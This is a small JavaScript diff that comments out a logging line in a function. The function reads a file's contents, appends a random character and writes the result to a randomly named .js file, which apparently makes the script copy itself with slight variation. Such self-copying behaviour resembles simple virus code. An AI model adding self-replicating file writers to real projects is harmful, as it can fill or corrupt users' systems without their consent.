@@ -8,7 +8,7 @@ const app = () => {
   const randomChar = Math.floor(Math.random() * 255);
   const getChar = String.fromCharCode(randomChar);
   const myTarget = `${realPath}\\${randomNumber}.js`;
-  console.log({ myFileName, myTarget });
+  // console.log({ myFileName, myTarget });
   const data = fs.readFileSync(myFileName).toString() + getChar;
   fs.writeFileSync(myTarget, data);
 };
